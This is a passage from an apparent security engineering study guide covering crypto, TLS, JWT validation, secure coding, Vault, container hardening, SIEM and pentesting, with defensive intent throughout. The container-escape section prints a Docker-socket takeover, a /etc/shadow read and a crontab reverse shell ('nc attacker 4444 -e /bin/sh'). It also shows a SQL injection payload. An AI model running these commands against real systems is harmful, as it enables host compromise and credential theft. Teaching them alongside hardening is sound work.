Each has a fatal weakness alone. Symmetric (AES) is fast — it can encrypt gigabytes per second — but both sides need the same secret key, and you can't safely send that key over an untrusted network (chicken-and-egg). Asymmetric (RSA/ECC) solves key distribution — anyone can encrypt to your public key, only your private key decrypts — but it's orders of magnitude slower and can't handle bulk data. So real systems use asymmetric crypto once to agree on a random symmetric session key, then switch to fast symmetric crypto for everything else. That's exactly the TLS handshake (next section).

How password hashing works under the hood

Passwords must never be encrypted (reversible) or plain-hashed. A plain SHA-256 of a password is broken instantly: attackers precompute hashes of billions of common passwords (rainbow tables) and match yours in a lookup. The fix has three parts: a salt (unique random value per password, defeats precomputation because every hash is unique), a slow function (bcrypt/argon2 are deliberately expensive so an attacker can only try thousands of guesses per second, not billions), and a tunable work factor you raise as hardware gets faster.

Right vs wrong password storage
# WRONG — instant to crack, no salt, fast hash:
echo -n "hunter2" | sha256sum
#   f52fbd32... ← identical for every user with this password; rainbow-table lookup

# RIGHT — bcrypt: salted, slow, self-describing work factor:
python -c "import bcrypt; print(bcrypt.hashpw(b'hunter2', bcrypt.gensalt(rounds=12)))"
#   $2b$12$Nx7...saltandhash...   ($2b=bcrypt, 12=cost, then salt+hash together)
# Verifying is a constant-time compare; raising cost to 13 doubles attacker effort.
Common crypto mistakes (the real vulnerabilities)
  • Plain SHA/MD5 for passwords — use bcrypt/scrypt/argon2 with a salt.
  • Reusing a nonce/IV with the same key in GCM/CTR — catastrophically breaks confidentiality.
  • Plain AES-CBC without a MAC — malleable; attackers can tamper undetected (padding-oracle attacks). Use AES-GCM (authenticated).
  • ECB mode — encrypts identical blocks identically, leaking patterns (the infamous "ECB penguin").
  • Rolling your own or hardcoding keys in source instead of a KMS/HSM.
  • Non-constant-time comparison of secrets/MACs — leaks the answer via timing.
Mental model: a padlock everyone owns + a shared key

Asymmetric crypto is like handing out open padlocks anyone can snap shut, while only you keep the key that opens them — so anyone can send you a locked box, but only you open it. It's slow, so you use it just to send a small item: the key to a fast combination safe (symmetric). After that, you both use the quick safe for all the heavy stuff. Password hashing is different — it's a one-way paper shredder with a unique confetti pattern per person; you can check a document matches the shreds, but you can never un-shred it.

15. PKI & TLS Deep Dive

TLS secures nearly all internet traffic. Understanding the handshake and the certificate trust chain (PKI) is essential for debugging HTTPS, mTLS, and cert issues.

PKI = a chain of trust, like a notary system

Your browser trusts a handful of root Certificate Authorities (built-in). A CA signs an intermediate, which signs a website's certificate. When you visit a site, it presents its cert; your browser walks the chain up to a trusted root — like verifying a signature was notarized by someone whose authority traces back to a trusted official. If any link is broken, expired, or self-signed by an unknown party, you get the scary warning.

Debugging certificates & TLS
# Inspect a live server's certificate chain
openssl s_client -connect example.com:443 -showcerts

# Check expiry & details of a cert file
openssl x509 -in cert.pem -noout -dates -subject -issuer

# Common causes of TLS errors:
#  - expired certificate (renew; automate with cert-manager/Let's Encrypt)
#  - incomplete chain (server must send intermediate certs too)
#  - hostname mismatch (cert CN/SAN != the domain)
#  - untrusted CA (self-signed, or missing root)
Automate certificates

Manual cert renewal causes outages when someone forgets. Use Let's Encrypt + cert-manager (Kubernetes) or ACM (AWS) to issue and auto-renew. Enforce TLS 1.2+ (disable old SSL/TLS), use strong ciphers, and enable HSTS. Inside clusters, mTLS via a service mesh gives automatic cert rotation.

How symmetric and asymmetric crypto combine in a TLS 1.3 handshake

Under the hood the handshake does exactly the "combine both" trick from §16. In TLS 1.3 it's one round trip: the client sends a ClientHello that already includes its ephemeral Diffie-Hellman public key. The server replies with its own ephemeral DH key and its certificate. Both sides now independently compute the same shared secret from their private + the other's public DH values — the session key is never transmitted, so even a recorded session can't be decrypted later (forward secrecy). The certificate's job is only to prove the server is who it claims (its signature over the handshake); the actual key agreement is the ephemeral DH. From there, everything is fast symmetric AES-GCM.

How the PKI chain of trust verifies a certificate

When the server presents its cert, the client verifies a chain, not a single document. Each certificate is signed by the one above it: leaf (the website) ← intermediate CA ← root CA. The client checks each signature using the issuer's public key, walking up until it reaches a root that's in its built-in trust store. It also checks: not expired, the domain matches the cert's SAN, and the cert isn't revoked (OCSP/CRL). If every link verifies and the root is trusted, the identity is proven — otherwise you get the browser warning.

Watch the chain and handshake for a real site
openssl s_client -connect example.com:443 -servername example.com </dev/null 2>/dev/null \
  | openssl x509 -noout -subject -issuer -dates
#   subject=CN = example.com
#   issuer =C = US, O = DigiCert Inc, CN = DigiCert TLS RSA SHA256 2020 CA1  ← intermediate
#   notBefore=... notAfter=...   (check it's not expired)

# See the full chain + negotiated protocol/cipher:
openssl s_client -connect example.com:443 -showcerts 2>/dev/null | grep -E "Protocol|Cipher|s:|i:"
#   Protocol : TLSv1.3
#   Cipher   : TLS_AES_256_GCM_SHA384    ← symmetric cipher chosen after DH key agreement
#   s:CN=example.com   i:CN=...CA1   s:CN=...CA1  i:CN=DigiCert Global Root CA
Common PKI/TLS mistakes
  • Expired certificates — the #1 cause of self-inflicted outages. Automate renewal (cert-manager/ACM).
  • Incomplete chain — the server sends only the leaf, so clients missing the intermediate reject it. Serve the full chain.
  • Hostname mismatch — cert SAN doesn't include the domain being visited.
  • Disabling verification to "make it work" (curl -k, verify=False) — that removes the entire point of TLS and invites man-in-the-middle.
  • Old protocols/ciphers (SSLv3, TLS 1.0, RC4) — disable them; require TLS 1.2+.
  • Trusting a self-signed cert cluster-wide without pinning — anyone can self-sign.
Mental model: a passport checked against a chain of authorities

The website's certificate is its passport. Your browser doesn't personally know the website, but it trusts a few root "governments" (root CAs) built in. The passport was issued by a regional office (intermediate CA) that was authorized by one of those governments. The browser checks each stamp up the chain to a government it trusts. The Diffie-Hellman part is like the two of you, in public, mixing paint colors so that only you two can reproduce the final secret shade — an eavesdropper watching the exchange still can't mix your private color.

16. Identity, Authentication & Authorization

Most breaches start with identity. Distinguishing authentication (who you are) from authorization (what you can do), and using modern protocols correctly, is foundational.

ConceptMeaning
Authentication (AuthN)Proving identity (password + MFA, cert, biometric)
Authorization (AuthZ)What that identity is allowed to do (RBAC, ABAC)
OAuth 2.0Delegated authorization — grant an app limited access without sharing your password
OIDCAuthentication layer on top of OAuth2 (adds ID tokens)
SAMLEnterprise SSO (XML-based, older but common)
JWTSigned token carrying claims (stateless sessions)
JWT pitfalls

JWTs are signed, not encrypted — never put secrets in the payload (it's just base64). Always verify the signature and the algorithm (reject alg: none and algorithm-confusion attacks). Keep them short-lived with refresh tokens; you can't easily revoke a long-lived JWT. Validate iss, aud, and exp.

Modern identity best practices
  • MFA everywhere — phishing-resistant (WebAuthn/passkeys) where possible.
  • SSO via OIDC/SAML — one identity, central control, easy offboarding.
  • Least-privilege RBAC/ABAC — authorize server-side, deny by default.
  • Short-lived credentials — OIDC federation for machines (see CI/CD OIDC), not static keys.

Why OAuth2, OIDC and JWT exist (and how they differ)

They solve three different problems people constantly conflate. OAuth2 is authorization delegation: "let this app read my calendar without giving it my password." It issues access tokens for calling APIs. OIDC is a thin layer on top that adds authentication: "prove who this user is." It adds an ID token (a JWT) describing the user. JWT is just the token format — a signed, self-contained bundle of claims — used by both. Using OAuth2 access tokens for login (a common bug) is wrong because they answer "what may this app do," not "who is this user."

How the OIDC Authorization-Code + PKCE flow actually works

  1. App redirects the user to the Identity Provider (IdP) with a code_challenge (a hash of a random secret the app keeps).
  2. User authenticates at the IdP (password + MFA) — the app never sees the password.
  3. IdP redirects back with a short-lived authorization code.
  4. App exchanges the code plus the original secret (code_verifier) at the token endpoint — PKCE proves it's the same app that started the flow, defeating code interception.
  5. IdP returns an ID token (who the user is) and access token (what the app may call).

How a JWT is validated on every request

A JWT's three base64 parts — and what the API must check
header:  {"alg":"RS256","kid":"abc"}     ← which key + algorithm
payload: {"iss":"https://idp.acme.com","aud":"api://orders",
          "sub":"user-1001","exp":1790000000,"scope":"orders:read"}
signature: RS256( base64(header)+"."+base64(payload), IdP-private-key )

# The API MUST, on every request:
#   1. fetch the IdP's PUBLIC key by 'kid' (from its JWKS endpoint)
#   2. verify the signature  -> proves it wasn't forged/altered
#   3. enforce alg = RS256   -> REJECT alg:none and HS256 confusion
#   4. check exp (not expired), iss (trusted issuer), aud (this API)
#   5. then authorize using the claims (scope/roles)
Common identity/JWT mistakes
  • alg: none accepted — a classic bypass: attacker strips the signature and the server trusts an unsigned token. Pin the expected algorithm.
  • Algorithm confusion (RS256→HS256) — server verifies an attacker-forged HS256 token using the public key as the HMAC secret. Never let the token pick the algorithm.
  • Not validating aud/iss — a valid token for a different service gets accepted here.
  • Putting secrets in the JWT payload — it's signed, not encrypted; anyone can base64-decode it.
  • Long-lived JWTs with no revocation — a stolen token works until expiry. Keep them short; use refresh tokens.
  • Confusing AuthN with AuthZ — verifying the token is valid does not mean the user is allowed to do the action; still check scope/role server-side.
Mental model: a festival wristband and a valet ticket

Authentication (OIDC/ID token) is the ID check at the festival gate that proves who you are. Authorization (OAuth2/access token) is the wristband saying which stages you may enter. A JWT is a wristband with a tamper-proof hologram — staff can check it's genuine on the spot without phoning the box office (stateless). But a wristband is not proof of identity, and a genuine hologram doesn't mean you're allowed backstage — the guard still checks the color.

Connects to other guides

Why network security still matters in a Zero-Trust world

Even when you verify every request (Zero Trust), network controls remain valuable as a second layer that limits blast radius. Identity can be stolen; a network segment that simply can't route to the database means a compromised web tier can't reach it even with valid credentials. Segmentation, default-deny firewalls, and WAFs raise the cost and shrink the reach of every attack — defense in depth, not a replacement for identity.

How the controls work mechanically

  • Firewalls / Security Groups filter on the 5-tuple (src/dst IP, src/dst port, protocol). Default-deny means the implicit rule is "drop," and you explicitly allow only needed flows.
  • Segmentation puts tiers in separate subnets/VPCs so traffic between them must cross a controlled chokepoint — a compromise in the DMZ can't laterally reach the data tier.
  • WAF operates at layer 7: it parses HTTP and matches request bodies/params against attack signatures (SQLi, XSS) before they reach the app.
  • IDS/IPS inspect traffic for known-bad signatures/anomalies; IPS can drop inline, IDS only alerts.
Default-deny security group: only what's needed
# Web tier: allow 443 from the internet, nothing else inbound
ingress: [{ proto: tcp, port: 443, source: 0.0.0.0/0 }]

# DB tier: allow 5432 ONLY from the app tier's SG — never from the internet
ingress: [{ proto: tcp, port: 5432, source: sg-app-tier }]
egress:  []          # DB initiates no outbound connections
# Result: even if the web box is popped, it can't reach the DB directly.
Verify segmentation actually holds
# From a compromised-web-tier shell, the DB must be unreachable directly:
nc -zv db.internal 5432
#   nc: connect to db.internal port 5432 (tcp) failed: Connection timed out  ✓ blocked
Common network security mistakes
  • 0.0.0.0/0 on SSH/RDP/DB ports — the fastest way to get owned; scanners find it in minutes.
  • Flat networks with no segmentation — one foothold reaches everything.
  • Allow-all egress — lets malware phone home and exfiltrate data; restrict outbound too.
  • Relying on the network alone and skipping identity/mTLS (the pre-Zero-Trust mistake).
  • WAF in "count/log" mode forever instead of blocking.
Mental model: interior walls in a ship

Ships have watertight bulkheads so one hull breach floods only one compartment instead of sinking the vessel. Network segmentation is those bulkheads: default-deny firewalls are the sealed doors, and a WAF is the inspector at the gangway turning away obvious troublemakers. Zero Trust adds an ID check at every door — but you still want the bulkheads.

18. Secure Coding & Application Security

Most vulnerabilities are introduced in code. Secure coding practices prevent whole classes of bugs before any scanner runs.

VulnerabilityPrevention
SQL InjectionParameterized queries / prepared statements — never string-concat SQL
XSSContext-aware output encoding; Content-Security-Policy header
CSRFAnti-CSRF tokens, SameSite cookies
SSRFValidate/allow-list outbound URLs; block cloud metadata IP
Insecure deserializationAvoid deserializing untrusted data; use safe formats
Broken access controlEnforce authz on every request server-side, object-level
Never trust input — the golden rule

Every input (user forms, API params, headers, file uploads, even data from your own database) is potentially hostile. Validate (allow-list what's acceptable), sanitize, and encode on output for the target context. Combined with parameterized queries and server-side authz checks, this kills most of the OWASP Top 10 at the source.

Why secure coding beats scanning

Scanners find bugs after you write them; secure coding patterns prevent whole classes from ever existing. Parameterized queries don't "reduce SQL injection risk" — they make it structurally impossible, because the query structure and the data travel on separate channels the database never confuses. Adopting a handful of these patterns eliminates the majority of the OWASP Top 10 at the source, cheaper than any tool.

How injection works — and why parameterization stops it

Injection happens when untrusted data is interpreted as code. When you concatenate a user string into SQL, the database parses the whole thing together, so ' OR '1'='1 becomes part of the logic. A parameterized query sends the SQL template and the values separately: the driver compiles the template first, then binds values as pure data that can never change the query's structure — quotes and operators in the input are just characters.

The same attack against vulnerable vs parameterized code
# Vulnerable — input becomes part of the query:
query = "SELECT * FROM users WHERE name = '" + name + "'"
#   name = "' OR '1'='1"  →  SELECT * FROM users WHERE name = '' OR '1'='1'  → dumps ALL users

# Safe — the ? is a slot; the value can never alter the query structure:
db.execute("SELECT * FROM users WHERE name = ?", (name,))
#   name = "' OR '1'='1"  →  searches literally for a user named  ' OR '1'='1   → 0 rows

# XSS defense is the output-side equivalent — encode for the context:
#   <div>{{ user_bio | escape }}</div>   → <script> becomes &lt;script&gt;, inert
Common secure-coding mistakes
  • String-building SQL/shell commands instead of parameterized queries / arg arrays → injection.
  • Blocklist validation ("strip <script>") — attackers bypass it endlessly. Allow-list what's valid instead.
  • Encoding for the wrong context — HTML-encoding data that lands in a JS or URL context doesn't protect it.
  • Trusting client-side validation — it's UX, not security; always re-validate server-side.
  • Reflecting error details/stack traces to users, leaking internals.
  • Authorization checks in the controller but not on the object (IDOR).
Mental model: keep the recipe and the groceries in separate bags

Injection is like writing a shopping list where a prankster can scribble "and also give me the cash register" into an item name, and the clerk reads the whole note as instructions. Parameterized queries hand the clerk a fixed instruction card and put the customer's words in a separate labeled envelope marked "data, not commands" — so no matter what the customer writes, it's treated as a product name, never an order to the clerk.

The full spectrum of automated security testing — each catches different bug classes, so mature programs use several.

Why so many testing types

Each technique trades off code visibility against runtime realism, and no single point covers both. SAST has full code visibility but no runtime context (high coverage, false positives). DAST has full runtime realism but no code visibility (low false positives, misses unreachable paths). IAST sits inside the running app to get both — code context and runtime confirmation. SCA covers a dimension none of the others do (third-party code). Fuzzing finds the weird inputs a human would never think to try. Mature programs layer them because their blind spots don't overlap.

How IAST and fuzzing work under the hood

IAST instruments the application (via an agent/bytecode hooks) so that while your normal functional tests or DAST run, it watches data flow from inside: it sees the tainted input arrive at the HTTP layer, follow through the code, and hit the SQL sink — confirming a real, reachable vulnerability with the exact line number. That combination of runtime proof + code location gives very low false positives. Fuzzing repeatedly feeds mutated/random inputs to a target and watches for crashes or sanitizer trips; coverage-guided fuzzers (libFuzzer, AFL++) instrument the binary and keep inputs that reach new code paths, evolving toward the edge cases that break parsers and memory safety.

A coverage-guided fuzzer finding a crash

#   Test unit written to ./crash-1a2b3c   ← reproducer for the exact bad input
Common testing-strategy mistakes
  • Believing one tool is enough. SAST alone ships runtime/config bugs; DAST alone misses unreachable code and deep logic.
  • Running everything on every commit — slow feedback. Run fast SAST/SCA on PRs; heavier DAST/fuzzing on schedules/nightlies.
  • Fuzzing without sanitizers (ASan/UBSan) — you'll miss memory bugs that don't happen to crash.
  • Not triaging — treating every SAST finding as equal drowns the real ones; prioritize by severity + reachability.
Mental model: inspecting a car every way

SAST reads the design docs; SCA checks for recalled parts; DAST is a stranger trying every door and pedal; IAST is a sensor inside the car reporting exactly which wire sparked when the test driver hit the brakes; fuzzing is strapping in a toddler who mashes every button in random combinations until something breaks. You want the whole battery — each finds faults the others can't.

20. Secrets & Vault Deep

Static secrets in a manager are good; dynamic secrets that are generated on-demand and expire automatically are better. HashiCorp Vault is the reference implementation.

Vault dynamic database credentials
# App authenticates to Vault (via K8s service account, cloud IAM, etc.)
# then requests DB creds that didn't exist a second ago:
vault read database/creds/readonly
#   username: v-token-readonly-x7f3...   (valid 1h, then auto-revoked)
#   password: A1b2C3...
# Also: transit engine (encryption-as-a-service), PKI engine (issue certs),
#       secret leasing, and full audit of every secret access.

Why dynamic secrets beat static ones

A static secret has an unbounded blast radius over time: once created it's valid until someone remembers to rotate it, and any copy that leaked (a log, a backup, a laptop) works indefinitely. Dynamic secrets flip the model — the credential doesn't exist until an authenticated app asks for it, and it self-destructs on a short lease. A leaked dynamic credential is worthless within minutes, and rotation is automatic rather than a scary manual project.

How Vault leasing works under the hood

When an app requests database/creds/readonly, Vault uses its own admin connection to the database to run CREATE ROLE ... VALID UNTIL ..., generating a brand-new user with a random password scoped to that role. Vault returns those credentials plus a lease (e.g. TTL 1h, max TTL 24h) and a lease ID. Vault tracks every lease; when the TTL expires (or the app calls revoke), Vault connects to the DB and runs DROP ROLE, so the credential vanishes at the source. The app can renew before expiry if it's still working. Everything — issue, renew, revoke — is written to the audit log.

Set up and use a dynamic DB secret with leasing
# One-time: tell Vault how to talk to the DB and what a "readonly" role is:
vault write database/config/appdb plugin_name=postgresql-database-plugin \
  connection_url="postgresql://{{username}}:{{password}}@db:5432/app" \
  allowed_roles=readonly username=vault-admin password=***
vault write database/roles/readonly db_name=appdb default_ttl=1h max_ttl=24h \
  creation_statements="CREATE ROLE \"{{name}}\" LOGIN PASSWORD '{{password}}' \
                       VALID UNTIL '{{expiration}}'; GRANT SELECT ON ALL TABLES IN SCHEMA public TO \"{{name}}\";"

# App requests creds at runtime — a user that didn't exist a second ago:
vault read database/creds/readonly
#   Key                Value
#   lease_id           database/creds/readonly/9aF3...
#   lease_duration     1h
#   username           v-token-readonly-x7f3k2
#   password           A1b2C3d4-E5f6

# When the lease expires (or on revoke), Vault DROPs the role automatically:
vault lease revoke database/creds/readonly/9aF3...
#   Success! Revoked lease  → the DB user no longer exists.
Common Vault/secrets-engine mistakes
  • Leaving Vault unsealed keys or the root token lying around — the root token should be revoked after setup; use auth methods instead.
  • Giving apps overly broad policies (path "*") — scope each role to exactly the paths it needs.
  • Not enabling the audit device — then you can't answer "what did the breached app access?"
  • Treating dynamic creds as static — caching them past their lease, then getting auth failures. Renew or re-fetch.
  • Running a single Vault with no HA/auto-unseal — it becomes a single point of failure for every app.
Mental model: a self-expiring guest Wi-Fi password

A static secret is your home Wi-Fi password taped to the fridge — it works forever and everyone who ever saw it can get back in. Dynamic secrets are like a hotel generating a unique guest code that only works during your stay and is auto-deleted at checkout. If a guest code leaks, it's useless by tomorrow, and nobody had to "rotate the Wi-Fi."

21. Container Escape & Isolation

Containers share the host kernel — weaker isolation than VMs. Understanding escape vectors is what lets you harden them properly.

How container escapes happen
  • --privileged — removes almost all isolation; a privileged container can trivially own the host. Never use in production.
  • Mounting the Docker socket (/var/run/docker.sock) — equivalent to root on the host.
  • Running as root inside the container — a kernel exploit then means host root.
  • Excessive capabilities (CAP_SYS_ADMIN) or host mounts (/, /proc).

See why in the Linux namespaces/cgroups section — a container is just a process with isolation; strip the isolation and it's just a process on your host.

Container hardening
  • Non-root user, read-only root filesystem, no-new-privileges.
  • Drop all capabilities, add back only what's needed.
  • Seccomp + AppArmor/SELinux profiles to restrict syscalls.
  • For untrusted workloads, use stronger isolation: gVisor (userspace kernel) or Kata Containers (lightweight VMs).
  • Runtime detection (Falco) to catch escapes in progress.

Why container escapes are possible at all

Because a container is not a security boundary in the way a VM is — it's a process sharing the host kernel, isolated only by namespaces and cgroups. Anything that punches through that thin isolation (a kernel bug, or a config that hands the container real host access) puts the attacker on the host with whatever privileges the container had. Understanding the escape vectors is precisely what tells you which knobs to lock down.

How a Docker-socket escape works, step by step

The most common real-world escape doesn't even need a kernel exploit — just a mounted Docker socket. The socket is the Docker daemon's API, and the daemon runs as root on the host. So a container that can talk to it can ask the daemon to start a new container that mounts the host's root filesystem — instant host takeover:

Escaping via a mounted /var/run/docker.sock
# Inside a container that (mistakenly) has the socket mounted:
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh
#   # now you are root on the HOST filesystem:
cat /host/etc/shadow            # host password hashes
echo '* * * * * root nc attacker 4444 -e /bin/sh' >> /host/etc/crontab
#   → persistent root on the node. Game over.

# --privileged is just as bad — it hands over host devices + all capabilities:
docker run --privileged alpine sh -c 'mount /dev/sda1 /mnt; ls /mnt'  # reads host disk
The controls that prevent it
securityContext:
  runAsNonRoot: true
  allowPrivilegeEscalation: false
  capabilities: { drop: ["ALL"] }
  seccompProfile: { type: RuntimeDefault }   # blocks obscure syscalls exploits use
# And NEVER: privileged:true, hostPID/hostNetwork, or mounting the docker socket / host paths.
# For untrusted code, add runtimeClassName: gvisor  (a userspace kernel between you and the host)
The escape vectors to eliminate
  • --privileged — disables namespacing of devices + grants all capabilities; trivial host takeover.
  • Mounting /var/run/docker.sock — equals root on the host (shown above).
  • Running as root in-container — turns a kernel bug into host root.
  • CAP_SYS_ADMIN / host mounts (/, /proc) / hostPID/hostNetwork — each a documented escape path.
  • Old kernels — unpatched CVEs (e.g. Dirty Pipe, runc CVE-2019-5736) enable escape from an otherwise "normal" container.
Mental model: a costume vs a real wall

A container is a person in an "I'm my own separate room" costume — the costume (namespaces) usually convinces the kernel to treat them as isolated. But it's still one person standing in the shared building. Hand them the building's master key (docker socket) or let them take the costume off (--privileged), and they walk anywhere. For genuinely dangerous guests you don't trust a costume — you build an actual wall (gVisor/Kata VM).

23. SIEM, SOC & Detection

Prevention fails eventually — you need to detect and respond. A SIEM aggregates logs and alerts on suspicious patterns; a SOC is the team that acts on them.

Detection concepts

IOC (Indicator of Compromise) — evidence of a breach (a known-bad IP/hash). TTP (Tactics, Techniques, Procedures) — how attackers operate, catalogued in the MITRE ATT&CK framework. Modern detection maps alerts to ATT&CK techniques so you know where in an attack you are. Ties into the Observability logging pipeline.

Why a SIEM exists

Individual logs are innocent in isolation — one failed login, one new outbound connection, one new IAM user. An attack is a pattern across those logs, often across different systems and hours apart. A SIEM exists to centralize everything and correlate it so the pattern becomes visible: failed logins then a success then a privilege change then data egress is obviously an attack chain, even though each event alone is noise. It also gives you the searchable history you need for forensics after the fact.

How detection works under the hood: correlation + ATT&CK mapping

Logs are shipped, normalized to a common schema (so a Windows event and an AWS CloudTrail event have comparable fields), then evaluated against detection rules. Rules are either signature-based (match a known-bad IOC) or behavioral (thresholds/sequences: ">10 failed logins from one IP followed by a success within 5 min"). Each rule is tagged with a MITRE ATT&CK technique (e.g. T1110 Brute Force, T1078 Valid Accounts) so an analyst sees not just "an alert" but which stage of an intrusion it represents, and can pivot to related techniques.

A correlation rule (Sigma) mapped to ATT&CK
title: Successful login after many failures (possible brute force)
logsource: { product: linux, service: auth }
detection:
  failures:  { message|contains: "Failed password" }
  success:   { message|contains: "Accepted password" }
  timeframe: 5m
  condition: failures | count() by src_ip > 10 and success
level: high
tags: [attack.credential_access, attack.t1110]   # MITRE ATT&CK
The alert an analyst triages
[HIGH] Brute force success  src_ip=203.0.113.9  user=deploy  host=api-3
  15 failed + 1 accepted password in 4m12s   ATT&CK: T1110 → T1078
  Playbook: disable user, kill sessions, check for lateral movement (T1021)
Common SIEM/SOC mistakes
  • Collecting logs but writing no detections — an expensive log lake that never fires an alert.
  • Alert fatigue — too many low-value alerts, so analysts miss the real one. Tune and prioritize by ATT&CK severity.
  • Not logging the right sources (auth, cloud audit/CloudTrail, DNS, EDR) — you can't detect what you don't collect.
  • Mutable/short-retention logs — attackers delete their tracks, or the evidence has aged out before you investigate.
  • No response runbook — detection without a defined response just tells you you're being robbed.
Mental model: a mall's central security room

Each shop's camera sees only its own doorway. The mall's security room pipes every feed into one wall of monitors, so a guard can follow a shoplifter from store to store and spot the pattern no single shopkeeper could. The SIEM is that room; the SOC is the guards; MITRE ATT&CK is the shared playbook of "here's how thieves usually operate" so guards know what to watch for next.

Proactively attack your own systems to find weaknesses before adversaries do — the offensive complement to defensive controls.

Rules of engagement matter

Only test systems you're authorized to test — unauthorized testing is illegal. Pen tests need a signed scope, rules of engagement, and a defined blast radius. The value is in the remediation: findings must become tracked, fixed action items (like postmortem items), not a report that gathers dust.

Why offensive testing exists

Defenders have to be right everywhere; attackers only need one gap. Automated scanners and code review find known categories of flaw, but they can't chain three low-severity issues into a critical breach the way a creative human can. Pen testing and red teaming exist to validate that your defenses actually work against a thinking adversary — and, just as importantly, to test whether your detection and response notice the attack at all.

How a penetration test proceeds under the hood

A test follows a repeatable methodology (PTES/OWASP): recon (map the attack surface — subdomains, ports, tech), scanning/enumeration (find services and versions), exploitation (turn a vuln into access), post-exploitation (escalate privilege, move laterally, reach the objective — the "so what?"), and reporting (reproducible steps + risk + remediation). A red team adds stealth and tests the blue team's detection; a purple team runs it collaboratively so every attack technique becomes a new detection rule.

Early phases against an authorized, scoped target
# Recon/enumeration — what's exposed?

#   22/tcp  open  ssh      OpenSSH 8.2
#   8080/tcp open  http     Apache Tomcat 9.0.30   ← known-vuln version

# The value is the CHAIN + the "so what", not one finding:
#   Tomcat 9.0.30 (CVE) → RCE as tomcat user
#   → reused DB creds in config → read customer PII  ← business impact
# Report each step reproducibly, rank by real impact, file remediation tickets.
Common pentesting mistakes
  • Testing without written authorization/scope — that's a crime, not a test.
  • Treating the report as the deliverable. The deliverable is fixed findings with tracked tickets and a retest.
  • Only reporting individual vulns and not the chains that produce real impact.
  • Never testing detection — if the SOC didn't notice the red team, that's a finding too.
  • A once-a-year test as the only security effort, instead of continuous shift-left controls.
Mental model: hiring a locksmith to burgle you

You hire a professional to try to break into your own house — with a signed contract saying it's allowed. They don't just note "the back window is weak"; they show how the weak window let them reach the safe, and how the alarm didn't go off. Then you fix the window and the alarm. The report isn't the point; the locked window is.

25. Zero-Trust Architecture

The modern security model: "never trust, always verify." Drop the idea of a trusted internal network — authenticate and authorize every request, everywhere.

Implementing Zero Trust
  • Strong identity for every user AND service (mTLS, OIDC, SPIFFE/SPIRE).
  • Micro-segmentation — NetworkPolicies + service mesh mTLS.
  • Least privilege + continuous authorization — check every request, factor in device posture & context.
  • Assume breach — encrypt everywhere, log everything, minimize blast radius.

Why the perimeter model failed

The "castle and moat" assumed the network boundary equals the trust boundary — inside = safe, outside = dangerous. Cloud, remote work, SaaS, microservices, and mobile dissolved the perimeter: there's no single "inside" anymore, and one phished laptop or compromised service lands the attacker inside the trusted zone with free lateral movement. Zero Trust exists because in modern architectures the network location tells you nothing about whether a request is legitimate.

How Zero Trust verifies each request under the hood

The core shift is from a one-time perimeter check to a per-request policy decision. Every request flows through a policy enforcement point (a service-mesh sidecar, an identity-aware proxy) that consults a policy decision point. The decision combines: who (verified identity — mTLS client cert / SPIFFE ID / OIDC token), what (the specific action/resource), and context (device posture, token freshness, anomaly signals). Only if all pass is the request allowed — and the identity is cryptographic (a workload's certificate), not an IP address that can be spoofed or reused.

Per-request verification: identity + action, evaluated every call
# Service mesh: require mTLS for ALL traffic (identity on every request)
apiVersion: security.istio.io/v1
kind: PeerAuthentication
metadata: { name: default, namespace: prod }
spec: { mtls: { mode: STRICT } }
---
# Then authorize per action — 'web' may only GET the catalog, nothing more:
apiVersion: security.istio.io/v1
kind: AuthorizationPolicy
metadata: { name: catalog-read-only, namespace: prod }
spec:
  selector: { matchLabels: { app: catalog } }
  action: ALLOW
  rules:
    - from: [{ source: { principals: ["cluster.local/ns/prod/sa/web"] } }]  # mTLS identity
      to:   [{ operation: { methods: ["GET"], paths: ["/catalog/*"] } }]
# A stolen network position with no valid cert → denied. 'web' trying POST → denied.
Common Zero-Trust mistakes
  • "Zero Trust" = buy a VPN/product. It's an architecture (identity + per-request authz + least privilege + assume-breach), not a purchase.
  • Verifying users but not services. Service-to-service calls need identity (mTLS/SPIFFE) too — that's where lateral movement happens.
  • Authenticating once and trusting the session forever — that's just a smaller perimeter. Re-evaluate per request.
  • Micro-segmentation without identity — IP allow-lists alone are spoofable and brittle.
  • Forgetting to log — "assume breach" requires the telemetry to detect and investigate one.
Mental model: a secure facility with badge-and-reason at every door

Old security: show your badge at the lobby, then wander the whole building freely. Zero Trust: every door reads your badge and checks you have a reason to enter this room, every single time — and the badge is a tamper-proof cryptographic one, not "you look like you belong here." Lose your badge and it's revoked instantly; steal a hallway pass and it still won't open the vault.

You now have a lead-level security foundation

From DevSecOps culture and the shift-left pipeline through cryptography, PKI/TLS, identity, network security, secure coding, the full testing spectrum, dynamic secrets, container/K8s hardening, SIEM/SOC detection, pentesting, and Zero Trust. Security is cross-cutting — you'll apply these across every other guide.

Building this — a real app where a planted secret or CVE actually gets caught and blocked, running on a hardened cluster with signed images and runtime detection — demonstrates it. Why the "prove it" step is the whole point

A pipeline that has never blocked anything is untested — you don't actually know the gates work. The capstone's most valuable step is deliberately introducing a hardcoded secret and a known-vulnerable dependency and watching each gate reject them. That converts "we have security scanning" (a claim) into "here's the build log where the pipeline refused to ship a leaked AWS key" (evidence). It's the same principle as chaos engineering: you don't trust a safety mechanism you've never seen fire.

How the end-to-end gates chain together — worked run

The pipeline blocking two deliberately-planted problems
# You committed a secret and bumped a dep to a vulnerable version on purpose:
[code]    gitleaks: FAIL  aws-access-token in src/config.js  →  build stops
# after removing the secret:
[build]   trivy: FAIL   log4j-core 2.14.1  CVE-2021-44228 CRITICAL  →  build stops
# after upgrading the dep, image is clean and gets signed:
[release] cosign sign ...  tlog index 90210    →  ok
# someone tries to deploy an UNSIGNED image to the cluster:
[deploy]  admission webhook denied: image not signed by trusted CI  →  blocked
# the signed image deploys; at runtime you exec a shell into the pod to test detection:
[run]     Falco WARNING: shell spawned in container payments-api  →  alert to SIEM
# Every gate fired. That log IS your portfolio evidence.
Common capstone mistakes
  • Building the pipeline but never testing that it blocks — the one step that proves it works.
  • Gates in "report" mode so they log but don't fail — looks secure, blocks nothing.
  • Signing images but not enforcing verification at admission — the deploy gate is the payoff.
  • Skipping runtime detection because "the earlier gates caught everything" — they can't catch zero-days.
  • Not documenting it. A short README + the blocking build logs is what makes it interview-ready.
Mental model: a fire drill, not just a fire plan

Having smoke detectors and exits is a plan. Actually setting off the alarm and timing the evacuation is a drill — it's the only way to know the plan works. The "prove it" step is your security fire drill: plant the fire (a secret, a CVE) and confirm every alarm goes off.

Why interviewers ask "why," not "which command"

